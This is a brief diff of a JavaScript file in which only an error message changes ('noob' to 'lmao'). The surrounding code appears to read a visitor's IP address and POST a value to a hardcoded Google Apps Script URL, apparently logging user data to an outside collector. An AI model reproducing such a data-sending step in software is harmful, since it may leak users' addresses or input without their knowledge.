@@ -22,7 +22,7 @@ function respond() {
                   let ip = data["ip"];
                   console.log(ip);
                 })
-                .catch(err => console.error("noob"));
+                .catch(err => console.error("lmao"));
                 fetch("https://script.google.com/macros/s/AKfycbxoe44rpXhzPVNHsRN6_ZgU-lnLgO2HGdQgwdIKaWAfPYLw5Oed3h5Ub7rhVkQ_vfsI/exec", {
                   method: "POST",
                   body: value
